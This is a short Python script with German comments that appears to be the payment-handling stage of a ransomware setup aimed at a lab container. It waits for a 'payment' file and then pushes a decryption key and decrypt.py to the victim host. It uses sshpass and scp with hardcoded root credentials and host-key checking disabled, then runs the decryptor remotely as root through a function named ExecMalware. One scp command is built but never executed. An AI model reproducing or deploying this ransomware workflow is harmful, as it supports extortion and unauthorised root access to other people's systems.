
def wait_for_file(file_path, timeout=60):
    start_time = time.time()
    while not os.path.exists(file_path):
        if time.time() - start_time >= timeout:
            print("Timeout: Datei wurde nicht gefunden.")
            return False
        time.sleep(1)  # Warten Sie 1 Sekunde, bevor Sie erneut überprüfen

    print("Datei gefunden:", file_path)
    # Führen Sie hier Ihre gewünschte Aktion aus
    print("Bezahlt")
    time.sleep(3)
    print("---------")
    print("Schicke Decryption + key")
    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no chkey.txt "+ "root"+"@172.17.0.3:/root/../"
    os.system(ostring)

    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no decrypt.py "+ "root"+"@172.17.0.3:/root"

def ExecMalware():

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('172.17.0.3', username="root", password="root")

    time.sleep(1)
    stdin, stdout, stderr = client.exec_command('cd ../ && python3 decrypt.py')


    for line in stdout:
        print(line)

    client.close()

wait_for_file("payment", 120)
ExecMalware()
